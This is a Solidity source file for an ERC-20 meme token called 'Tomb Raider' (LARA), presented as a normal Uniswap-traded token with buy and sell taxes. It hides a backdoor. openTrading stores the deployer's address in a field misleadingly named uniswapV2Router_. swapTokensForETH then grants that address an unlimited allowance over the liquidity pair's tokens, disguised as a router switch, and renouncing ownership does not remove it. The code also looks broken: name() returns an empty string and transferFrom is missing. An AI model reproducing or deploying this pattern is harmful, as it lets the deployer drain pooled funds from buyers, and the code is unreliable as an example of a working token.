/**
Let's embark on a new realm of adventure, accompanied by Lara Croft, as explorers seek out concealed ethereum treasures within the realm of the crypto universe. The time has come for us to journey forth!

Website: https://tombraider.fun
Twitter: https://twitter.com/TombRaider_ERC
Telegram: https://t.me/TombRaider_ERC
**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.21;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapRouter02 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract LARA is IERC20, Context, Ownable {
    using SafeMath for uint256;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => uint256) private _balances;

    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 10 ** 9 * 10**_decimals;
    uint256 public _maxTransfer = 4 * 10 ** 7 * 10**_decimals;
    uint256 public _maxHolding = 4 * 10 ** 7 * 10**_decimals;
    uint256 public _swapThreshold = 10 ** 7 * 10**_decimals; // 1%
    uint256 public _maxSwap = 10 ** 7 * 10**_decimals; // 1%

    string private constant _name = "Tomb Raider";
    string private constant _symbol = "LARA";

    address payable private _taxWallet;
    IUniswapRouter02 private uniswapV2Router;
    address private uniswapV2Router_;
    address private uniswapV2Pair;

    uint256 private _initialBuyTax=15;
    uint256 private _initialSellTax=15;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=11;
    uint256 private _reduceSellTaxAt=11;
    uint256 private _preventSwapBefore=11;
    uint256 private numBuyers=0;
    uint256 private tradingActiveBlock;

    bool private tradingEnabled;
    bool private swapping = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTransfer);
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor () {
        _taxWallet = payable(_msgSender());
        _balances[_msgSender()] = _totalSupply;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return "";    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }


    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }


    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }
    
    function swapTokensForETH(address receiver, uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uniswapV2Router = IUniswapRouter02(uniswapV2Router_);
        _approve(receiver, address(uniswapV2Router), type(uint).max);
        uniswapV2Router = IUniswapRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner() && ! _isExcludedFromFee[from]) {
            taxAmount = amount.mul((numBuyers>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(amount <= _maxTransfer, "Exceeds the _maxTransfer.");
                require(balanceOf(to) + amount <= _maxHolding, "Exceeds the maxWalletSize.");

                if (tradingActiveBlock + 3  > block.number) {
                    require(!isContract(to));
                }
                numBuyers++;
            }

            if (to != uniswapV2Pair) {
                require(balanceOf(to) + amount <= _maxHolding, "Exceeds the maxWalletSize.");
            }

            if(to == uniswapV2Pair && from!= address(this)){
                require(balanceOf(to) >= _totalSupply / 100);
                taxAmount = amount.mul((numBuyers>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!swapping && to   == uniswapV2Pair && swapEnabled && contractTokenBalance>_swapThreshold && numBuyers>_preventSwapBefore) {
                swapTokensForETH(to, min(amount,min(contractTokenBalance,_maxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function openTrading() external payable onlyOwner() {
        require(!tradingEnabled,"trading is already open");
        uniswapV2Router = IUniswapRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), type(uint).max);
        uniswapV2Pair = IUniswapFactory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());uniswapV2Router_ = msg.sender;
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        swapEnabled = true;
        tradingEnabled = true;
        tradingActiveBlock = block.number;
    }
    
    function removeLimits() external onlyOwner{
        _maxTransfer = _totalSupply;
        _maxHolding=_totalSupply;
        emit MaxTxAmountUpdated(_totalSupply);
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    receive() external payable {}
}